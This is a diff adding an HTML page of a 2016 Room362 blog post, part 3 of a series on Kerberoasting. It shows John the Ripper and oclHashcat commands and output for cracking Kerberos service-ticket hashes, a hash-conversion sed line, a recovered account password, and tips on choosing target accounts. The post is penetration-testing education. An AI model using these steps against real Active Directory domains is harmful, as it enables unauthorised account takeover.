@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.15" />
+
+  <title>Kerberoasting - Part 3 &middot; Room362</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Room362" href="http://room362.com/index.xml" />
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/androidstudio.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+  <link rel="shortcut icon" href="http://room362.com/img/favicon.ico" type="image/x-icon" />
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/brandon/"><i class='fa fa-users fa-fw'></i>Brandon</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://room362.com/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://twitter.com/mubix" target="_blank"><i class="fa fa-twitter fa-fw"></i>Twitter</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://facebook.com/mubix" target="_blank"><i class="fa fa-facebook fa-fw"></i>Facebook</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://plus.google.com/+mubix" target="_blank"><i class="fa fa-google-plus-square fa-fw"></i>Google+</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://instagram.com/mubix" target="_blank"><i class="fa fa-instagram fa-fw"></i>Instagram</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://flickr.com/photos/mubix" target="_blank"><i class="fa fa-flickr fa-fw"></i>Flickr</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://youtube.com/user/hak5" target="_blank"><i class="fa fa-youtube fa-fw"></i>YouTube</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://vimeo.com/mubix" target="_blank"><i class="fa fa-vimeo fa-fw"></i>Vimeo</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://slideshare.net/mubix" target="_blank"><i class="fa fa-slideshare fa-fw"></i>SlideShare</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://linkedin.com/in/mubix" target="_blank"><i class="fa fa-linkedin fa-fw"></i>LinkedIn</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://reddit.com/user/mubix" target="_blank"><i class="fa fa-reddit fa-fw"></i>Reddit</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/mubix" target="_blank"><i class="fa fa-github-alt fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https:////bitbucket.org/mubix" target="_blank"><i class="fa fa-bitbucket fa-fw"></i>Bitbucket</a>
+    </li>
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Kerberoasting - Part 3</h1>
+  <h2></h2>
+</div>
+<div class="content">
+
+  <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>22 May 2016, 07:35</time>
+  </div>
+
+  
+
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-tags fa-fw"></i>
+    
+      <a class="post-taxonomy-tag" href="http://room362.com/tags/kerberos">kerberos</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="http://room362.com/tags/jtr">jtr</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="http://room362.com/tags/oclhashcat">oclhashcat</a>
+    
+  </div>
+  
+  
+
+</div>
+
+  
+
+<p><strong>Previous works:</strong> There has been a number of different blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&rsquo;ll will be sure to reference it.</p>
+
+<p><strong>Attacker KB Link:</strong> (to be updated later)</p>
+
+<p><strong>Common Findings DB Link:</strong> (to be updated later)</p>
+
+<p>Now we start cracking the tickets we have and hopefully one will break. The problem with this format is that it takes a LONG time to crack, not as slow as some, but certainly not as fast as NTLM or the like, so pick your targets carefully as the more tickets you try and crack at once the slower it&rsquo;s going to go.</p>
+
+<h2 id="cracking-spn-tickets:7be8cc1d74d8f927d7e4d6214332d48a">Cracking SPN tickets</h2>
+
+<h3 id="john-the-ripper:7be8cc1d74d8f927d7e4d6214332d48a">John the Ripper</h3>
+
+<ul>
+<li>Format added September 30th 2015: <a href="https://github.com/magnumripper/JohnTheRipper/commit/05e514646dfe5aa65ee48774571c0169f7e25a53">https://github.com/magnumripper/JohnTheRipper/commit/05e514646dfe5aa65ee48774571c0169f7e25a53</a></li>
+</ul>
+
+<p>If you aren&rsquo;t already using the <a href="https://github.com/magnumripper/JohnTheRipper">magnumripper version of John The Ripper</a> you should be, it&rsquo;s the latest and great and usually has all of the updated formats, fixes, and speedups. In this case it&rsquo;s also the only version that has the KRB5TGS format.</p>
+
+<pre><code>root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi &gt; /tmp/johnkirb.txt
+
+root@wpad:~/johntheripper/run# ./john /tmp/johnkirb.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 11 password hashes with 11 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Warning: OpenMP is disabled; a non-OpenMP build may be faster
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:07 3.35% (ETA: 23:38:44) 0g/s 69751p/s 767263c/s 767263C/s 129700..123junior
+ASDqwe123        ($krb5tgs$unkown)
+ASDqwe123        ($krb5tgs$unkown)
+</code></pre>
+
+<p>w00t! Easy passwords. These are valid account passwords and you should be able to do with them whatever that account can do. We will explore the ability to use them as silver tickets later in this post but don&rsquo;t loose sight that you have a completely valid new account that has access somewhere.</p>
+
+<h3 id="oclhashcat:7be8cc1d74d8f927d7e4d6214332d48a">oclHashcat</h3>
+
+<p>John The Ripper is fast, but we need that GPU speed for slow hashes like this. Again, we are on the cutting edge of hashes it seems so we are going to have to build the <a href="https://github.com/hashcat/oclHashcat">Github version of oclHashcat</a></p>
+
+<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Support added to oclHashcat to crack Kerberos 5 TGS-REP: <a href="https://t.co/wsL2VUihNR">https://t.co/wsL2VUihNR</a> (Our first algorithm contributed by community, yay!)</p>&mdash; hashcat (@hashcat) <a href="https://twitter.com/hashcat/status/699861868094099456">February 17, 2016</a></blockquote>
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<p>Luckily, building it is pretty straight forward:
+<a href="https://github.com/hashcat/oclHashcat/blob/master/docs/BUILD.md">https://github.com/hashcat/oclHashcat/blob/master/docs/BUILD.md</a></p>
+
+<p>Problem is that we have hashes in John the Ripper format and we have to get them into a format that oclHashcat understands:</p>
+
+<p>Example Hashes: <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
+
+<pre><code>13100	Kerberos 5 TGS-REP etype 23 - $krb5tgs$23$*user$realm$test/spn*$140964709dbdeccbc6121b675ccfb8b2$af937e9d5691b74600e514a3105976f1a8ddb2eed3aeb008ea74ff50bee7a65f14e8c1cbbc360687e6d867c9fbe2e4b2004d0584f0c283a18f613c69c756f78c001647e01da84466f59c655a25913b0cb4e42f0dc88f461e921441da40d6fb56d40545f71b841d00f019f135eb93c2357253796e5dc7da8a455d4fe17c966c3ea3ac620eb5e51c44c8a9cc48d385680c64c519e2113497315e7d7623044d48e2272bd9836b754755c3494040b487757a936780daeff859dd2c8839
+</code></pre>
+
+<p>If you got your tickets from <strong>kirbi2john.py</strong> you can convert them using</p>
+
+<pre><code>cat kirbi2johnoutput.txt | sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/'
+</code></pre>
+
+<p>If you got them from <strong>Impacket</strong>, they are already in a format that is compatible with both John the Ripper and oclHashcat.</p>
+
+<p>Here is the speed results that Atom was getting using his AMD R9 GPU:</p>
+
+<p><a href="http://pastebin.com/raw/3eHx2bFr">http://pastebin.com/raw/3eHx2bFr</a></p>
+
+<pre><code>root@sf:~/oclHashcat# ./oclHashcat -m 13100 hash -w 3 -a 3 ?l?l?l?l?l?l?l 
+oclHashcat v2.01 (g0891e39) starting...
+
+Device #1: Hawaii, 2858/4025 MB allocatable, 1010Mhz, 44MCU
+Device #2: AMD FX(tm)-8120 Eight-Core Processor, skipped
+
+Hashes: 1 hashes; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Applicable Optimizers:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Brute-Force
+Watchdog: Temperature abort trigger set to 90c
+Watchdog: Temperature retain trigger set to 80c
+
+Device #1: Kernel /root/git/oclHashcat/kernels/m13100_a3.919aa8b9.kernel (234320 bytes)
+Device #1: Kernel /root/git/oclHashcat/kernels/markov_le.919aa8b9.kernel (36184 bytes)
+
+Device #1: autotuned kernel-accel to 64
+Device #1: autotuned kernel-loops to 50
+
+[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =&gt;
+
+$krb5tgs$23$*user$realm$test/hashcat*$08e2261b7a89e56f530b2f7e0620fe8b$ecdca97c13814c95810d7706faf986dad98d06ba033fc5a45fbe9b417b855db5:hashcat
+
+Session.Name...: oclHashcat
+Status.........: Cracked
+Input.Mode.....: Mask (?l?l?l?l?l?l?l) [7]
+Hash.Target....: $krb5tgs$23$*user$realm$test/hashcat*$08e...
+Hash.Type......: Kerberos 5 TGS-REP etype 23
+Time.Started...: Wed Feb 17 08:33:57 2016 (5 secs)
+Speed.Dev.#1...:   111.0 MH/s (80.83ms)
+Recovered......: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.......: 252313600/8031810176 (3.14%)
+Rejected.......: 0/252313600 (0.00%)
+Restore.Point..: 0/456976 (0.00%)
+HWMon.GPU.#1...:  0% Util, 42c Temp, 20% Fan
+
+Started: Wed Feb 17 08:33:57 2016
+Stopped: Wed Feb 17 08:34:04 2016
+</code></pre>
+
+<p>Where I was only getting about half of that speed against one hash (NVidia GTX 970):</p>
+
+<pre><code>Session.Name...: oclHashcat
+Status.........: Running
+Rules.Type.....: File (rules\dive.rule)
+Input.Mode.....: File (..\dictionarys\rockyou.txt)
+Hash.Target....: (snip)
+Hash.Type......: Kerberos 5 TGS-REP etype 23
+Time.Started...: Sun May 22 01:32:50 2016 (25 secs)
+Time.Estimated.: Sun May 22 09:04:48 2016 (7 hours, 31 mins)
+Speed.Dev.#1...: 57894.8 kH/s (14.37ms)
+Recovered......: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
+</code></pre>
+
+<p>And as you can see, going against 100 hashes pushed the wait time out to 30 days vs. 7 hours.</p>
+
+<pre><code>Session.Name...: oclHashcat
+Status.........: Running
+Rules.Type.....: File (rules\dive.rule)
+Input.Mode.....: File (..\dictionarys\rockyou.txt)
+Hash.Target....: (snip)
+Hash.Type......: Kerberos 5 TGS-REP etype 23
+Time.Started...: Sun May 22 01:35:16 2016 (16 secs)
+Time.Estimated.: Wed Jun 22 14:28:17 2016 (31 days, 12 hours)
+Speed.Dev.#1...: 55873.1 kH/s (14.11ms)
+Recovered......: 0/100 (0.00%) Digests, 0/1 (0.00%) Salts
+</code></pre>
+
+<p>So pick your targets and just go after the ones that are old / password hasn&rsquo;t been changed in years.</p>
+
+<h1 id="references:7be8cc1d74d8f927d7e4d6214332d48a">References:</h1>
+
+<h2 id="tools:7be8cc1d74d8f927d7e4d6214332d48a">Tools</h2>
+
+<ul>
+<li><a href="https://github.com/nidem/kerberoast">Kerberoast</a></li>
+<li><a href="https://github.com/coresecurity/impacket">Impacket</a></li>
+<li><a href="https://github.com/skelsec/PyKerberoast">PyKerberoast</a></li>
+<li><a href="https://github.com/magnumripper/JohnTheRipper">Github - John the Ripper - Magnumripper</a></li>
+<li><a href="https://github.com/hashcat/oclHashcat">Github - oclHashcat</a></li>
+</ul>
+
+<h2 id="presentations:7be8cc1d74d8f927d7e4d6214332d48a">Presentations</h2>
+
+<ul>
+<li>Tim Medin&rsquo;s Slides - <a href="https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf">Kicking the Guard Dog of Hades - slides</a></li>
+<li>Tim Medin&rsquo;s Video - <a href="https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;feature=youtu.be">Kicking the Guard Dog of Hades - video</a></li>
+</ul>
+
+<h2 id="other-write-ups:7be8cc1d74d8f927d7e4d6214332d48a">Other write ups</h2>
+
+<ul>
+<li><a href="http://malwarejake.blogspot.com/2015/11/kerberos-silver-tickets-unique-attacker.html">Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild</a></li>
+<li><a href="https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Brute-Forcing_Service_Account_Passwords.html">Ben Lincoln&rsquo;s writeup on Brute Forcing Service Account Passwords</a></li>
+<li><a href="https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/">Leon Jacob&rsquo;s writeup on Kerberoast</a></li>
+<li><a href="https://adsecurity.org/?p=2293">Sean Metcalf&rsquo;s writeup on Kerberoast</a></li>
+<li><a href="https://adsecurity.org/?page_id=183">Sean Metcalf&rsquo;s SPN directory</a></li>
+</ul>
+
+
+  
+<div class="prev-next-post pure-g">
+  <div class="pure-u-1 pure-u-md-1-2">
+    
+  </div>
+  <div class="pure-u-1 pure-u-md-1-2">
+    
+    <nav class="next">
+      <a href="http://room362.com/post/2016/kerberoast-pt2/">Kerberoasting - Part 2<i class="fa fa-arrow-circle-right fa-fw fa-lg"></i></a>
+    </nav>
+    
+  </div>
+</div>
+
+
+  
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    
+    
+    if (window.location.hostname == "localhost")
+        return;
+
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'room362';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+</div>
+
+</div>
+</div>
+<script src="http://room362.com/js/ui.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-198967-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+</body>
+</html>
+
